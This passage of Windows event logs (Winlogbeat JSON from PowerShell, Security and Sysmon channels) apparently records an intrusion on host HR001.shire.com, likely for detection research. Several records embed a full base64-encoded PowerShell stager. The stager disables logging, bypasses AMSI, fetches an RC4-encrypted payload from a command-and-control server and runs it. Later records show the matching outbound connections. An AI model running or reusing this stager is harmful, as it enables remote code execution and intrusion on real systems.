AE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = Get-Random\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71041\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell","Payload":"CommandInvocation(Get-Random): \"Get-Random\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\""},"task":"Executing Pipeline","level":"Information","opcode":"To be used when operation is just executing a method","thread_id":3896,"record_number":"92793","activity_id":"{c93a7728-017f-0000-cb04-4aca7f01d501}","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"log_name":"Microsoft-Windows-PowerShell/Operational","computer_name":"HR001.shire.com","version":1,"message":"CommandInvocation(Get-Random): \"Get-Random\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = Get-Random\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71041\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:"}
{"@timestamp":"2019-05-18T20:43:14.332Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"host":{"name":"WECserver"},"record_number":"288260","keywords":["Audit Success"],"event_data":{"Direction":"%%14593","SourcePort":"53377","ProcessID":"5452","Application":"\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe","SourceAddress":"172.18.39.106","DestAddress":"10.0.10.106","DestPort":"443","RemoteMachineID":"S-1-0-0","Protocol":"6","FilterRTID":"67557","LayerName":"%%14611","LayerRTID":"48","RemoteUserID":"S-1-0-0"},"provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","event_id":5156,"source_name":"Microsoft-Windows-Security-Auditing","type":"wineventlog","thread_id":6364,"computer_name":"HR001.shire.com","message":"The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t5452\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t172.18.39.106\n\tSource Port:\t\t53377\n\tDestination Address:\t10.0.10.106\n\tDestination Port:\t\t443\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t67557\n\tLayer Name:\t\tConnect\n\tLayer Run-Time ID:\t48","level":"Information","task":"Filtering Platform Connection","process_id":4,"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"opcode":"Info","log_name":"Security","version":1}
{"@timestamp":"2019-05-18T20:43:14.353Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"opcode":"Info","event_data":{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetObject":"HKU\\S-1-5-21-2511471446-1103646877-3980648787-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","EventType":"CreateKey","UtcTime":"2019-05-18 20:43:14.316","ProcessGuid":"{03ba39f5-50b2-5ce0-0000-00109995c501}","ProcessId":"5452"},"event_id":12,"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-05-18 20:43:14.316\nProcessGuid: {03ba39f5-50b2-5ce0-0000-00109995c501}\nProcessId: 5452\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKU\\S-1-5-21-2511471446-1103646877-3980648787-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","record_number":"2237804","level":"Information","source_name":"Microsoft-Windows-Sysmon","thread_id":3144,"task":"Registry object added or deleted (rule: RegistryEvent)","computer_name":"HR001.shire.com","host":{"name":"WECserver"},"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"process_id":2440,"type":"wineventlog","log_name":"Microsoft-Windows-Sysmon/Operational","version":2,"user":{"name":"SYSTEM","domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18"}}
{"@timestamp":"2019-05-18T20:43:14.353Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"event_id":3,"computer_name":"HR001.shire.com","type":"wineventlog","opcode":"Info","process_id":2440,"beat":{"hostname":"WECserver","version":"6.7.0","name":"WECserver"},"event_data":{"ProcessId":"5172","User":"SHIRE\\nmartha","Initiated":"true","DestinationPort":"443","SourceIp":"172.18.39.106","SourceIsIpv6":"false","DestinationIp":"10.0.10.106","UtcTime":"2019-05-07 11:56:31.075","ProcessGuid":"{03ba39f5-4cfe-5ce0-0000-00103600c001}","DestinationIsIpv6":"false","Protocol":"tcp","DestinationPortName":"https","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceHostname":"HR001.shire.com","SourcePort":"53375"},"host":{"name":"WECserver"},"message":"Network connection detected:\nRuleName: \nUtcTime: 2019-05-07 11:56:31.075\nProcessGuid: {03ba39f5-4cfe-5ce0-0000-00103600c001}\nProcessId: 5172\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nUser: SHIRE\\nmartha\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 172.18.39.106\nSourceHostname: HR001.shire.com\nSourcePort: 53375\nSourcePortName: \nDestinationIsIpv6: false\nDestinationIp: 10.0.10.106\nDestinationHostname: \nDestinationPort: 443\nDestinationPortName: https","record_number":"2237805","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","level":"Information","thread_id":2368,"task":"Network connection detected (rule: NetworkConnect)","version":5,"source_name":"Microsoft-Windows-Sysmon","log_name":"Microsoft-Windows-Sysmon/Operational"}
{"@timestamp":"2019-05-18T20:43:15.113Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"level":"Information","record_number":"2237806","event_id":3,"host":{"name":"WECserver"},"type":"wineventlog","task":"Network connection detected (rule: NetworkConnect)","event_data":{"User":"SHIRE\\nmartha","SourceIp":"172.18.39.106","Image":"C:\\Windows\\System32\\notepad.exe","DestinationIp":"10.0.10.106","Initiated":"true","SourceIsIpv6":"false","UtcTime":"2019-05-07 11:56:31.925","DestinationPort":"443","SourceHostname":"HR001.shire.com","SourcePort":"53376","DestinationPortName":"https","ProcessGuid":"{03ba39f5-652c-5ce0-0000-0010760bff01}","DestinationIsIpv6":"false","Protocol":"tcp","ProcessId":"7924"},"message":"Network connection detected:\nRuleName: \nUtcTime: 2019-05-07 11:56:31.925\nProcessGuid: {03ba39f5-652c-5ce0-0000-0010760bff01}\nProcessId: 7924\nImage: C:\\Windows\\System32\\notepad.exe\nUser: SHIRE\\nmartha\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 172.18.39.106\nSourceHostname: HR001.shire.com\nSourcePort: 53376\nSourcePortName: \nDestinationIsIpv6: false\nDestinationIp: 10.0.10.106\nDestinationHostname: \nDestinationPort: 443\nDestinationPortName: https","version":5,"computer_name":"HR001.shire.com","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"beat":{"version":"6.7.0","name":"WECserver","hostname":"WECserver"},"process_id":2440,"source_name":"Microsoft-Windows-Sysmon","thread_id":2368,"log_name":"Microsoft-Windows-Sysmon/Operational","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","opcode":"Info"}
{"@timestamp":"2019-05-18T20:43:15.208Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"event_id":10,"user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"thread_id":3144,"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","message":"Process accessed:\nRuleName: \nUtcTime: 2019-05-18 20:43:15.206\nSourceProcessGUID: {03ba39f5-ea62-5ccb-0000-001096a70000}\nSourceProcessId: 748\nSourceThreadId: 1148\nSourceImage: C:\\Windows\\system32\\svchost.exe\nTargetProcessGUID: {03ba39f5-e681-5cda-0000-00105cc50c00}\nTargetProcessId: 3476\nTargetImage: C:\\Windows\\System32\\svchost.exe\nGrantedAccess: 0x1000\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+12ae4|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+1295f|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+1260e|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+11e33|C:\\Windows\\SYSTEM32\\ntdll.dll+64db0|C:\\Windows\\SYSTEM32\\ntdll.dll+505c4|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","level":"Information","source_name":"Microsoft-Windows-Sysmon","computer_name":"HR001.shire.com","record_number":"2237807","version":3,"process_id":2440,"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"opcode":"Info","type":"wineventlog","task":"Process accessed (rule: ProcessAccess)","host":{"name":"WECserver"},"log_name":"Microsoft-Windows-Sysmon/Operational","event_data":{"GrantedAccess":"0x1000","SourceProcessGUID":"{03ba39f5-ea62-5ccb-0000-001096a70000}","SourceThreadId":"1148","TargetProcessGUID":"{03ba39f5-e681-5cda-0000-00105cc50c00}","TargetProcessId":"3476","TargetImage":"C:\\Windows\\System32\\svchost.exe","UtcTime":"2019-05-18 20:43:15.206","SourceProcessId":"748","SourceImage":"C:\\Windows\\system32\\svchost.exe","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+12ae4|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+1295f|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+1260e|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+11e33|C:\\Windows\\SYSTEM32\\ntdll.dll+64db0|C:\\Windows\\SYSTEM32\\ntdll.dll+505c4|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271"}}
{"@timestamp":"2019-05-18T20:43:15.213Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"log_name":"Microsoft-Windows-Sysmon/Operational","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"thread_id":3144,"process_id":2440,"version":3,"level":"Information","host":{"name":"WECserver"},"record_number":"2237808","source_name":"Microsoft-Windows-Sysmon","opcode":"Info","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","task":"Process accessed (rule: ProcessAccess)","event_data":{"UtcTime":"2019-05-18 20:43:15.206","SourceProcessGUID":"{03ba39f5-ea62-5ccb-0000-001096a70000}","SourceProcessId":"748","TargetProcessGUID":"{03ba39f5-e681-5cda-0000-00105cc50c00}","TargetImage":"C:\\Windows\\System32\\svchost.exe","SourceImage":"C:\\Windows\\system32\\svchost.exe","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+12ae4|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+1295f|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+1260e|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+11e33|C:\\Windows\\SYSTEM32\\ntdll.dll+64db0|C:\\Windows\\SYSTEM32\\ntdll.dll+505c4|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","SourceThreadId":"1148","TargetProcessId":"3476","GrantedAccess":"0x1000"},"event_id":10,"message":"Process accessed:\nRuleName: \nUtcTime: 2019-05-18 20:43:15.206\nSourceProcessGUID: {03ba39f5-ea62-5ccb-0000-001096a70000}\nSourceProcessId: 748\nSourceThreadId: 1148\nSourceImage: C:\\Windows\\system32\\svchost.exe\nTargetProcessGUID: {03ba39f5-e681-5cda-0000-00105cc50c00}\nTargetProcessId: 3476\nTargetImage: C:\\Windows\\System32\\svchost.exe\nGrantedAccess: 0x1000\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+12ae4|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+1295f|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+1260e|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+11e33|C:\\Windows\\SYSTEM32\\ntdll.dll+64db0|C:\\Windows\\SYSTEM32\\ntdll.dll+505c4|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","type":"wineventlog","computer_name":"HR001.shire.com"}
{"@timestamp":"2019-05-18T20:43:15.214Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"host":{"name":"WECserver"},"source_name":"Microsoft-Windows-Sysmon","process_id":2440,"user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"opcode":"Info","level":"Information","computer_name":"HR001.shire.com","event_id":10,"task":"Process accessed (rule: ProcessAccess)","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","version":3,"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"thread_id":3144,"record_number":"2237809","log_name":"Microsoft-Windows-Sysmon/Operational","message":"Process accessed:\nRuleName: \nUtcTime: 2019-05-18 20:43:15.206\nSourceProcessGUID: {03ba39f5-ea62-5ccb-0000-001096a70000}\nSourceProcessId: 748\nSourceThreadId: 8100\nSourceImage: C:\\Windows\\system32\\svchost.exe\nTargetProcessGUID: {03ba39f5-e681-5cda-0000-00105cc50c00}\nTargetProcessId: 3476\nTargetImage: C:\\Windows\\System32\\svchost.exe\nGrantedAccess: 0x1000\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+12ae4|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+1295f|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+1260e|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+11e33|C:\\Windows\\SYSTEM32\\ntdll.dll+64db0|C:\\Windows\\SYSTEM32\\ntdll.dll+505c4|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","event_data":{"TargetImage":"C:\\Windows\\System32\\svchost.exe","SourceProcessGUID":"{03ba39f5-ea62-5ccb-0000-001096a70000}","SourceThreadId":"8100","TargetProcessGUID":"{03ba39f5-e681-5cda-0000-00105cc50c00}","SourceProcessId":"748","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+12ae4|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+1295f|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+1260e|C:\\Windows\\SYSTEM32\\psmserviceexthost.dll+11e33|C:\\Windows\\SYSTEM32\\ntdll.dll+64db0|C:\\Windows\\SYSTEM32\\ntdll.dll+505c4|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","GrantedAccess":"0x1000","UtcTime":"2019-05-18 20:43:15.206","SourceImage":"C:\\Windows\\system32\\svchost.exe","TargetProcessId":"3476"},"type":"wineventlog"}
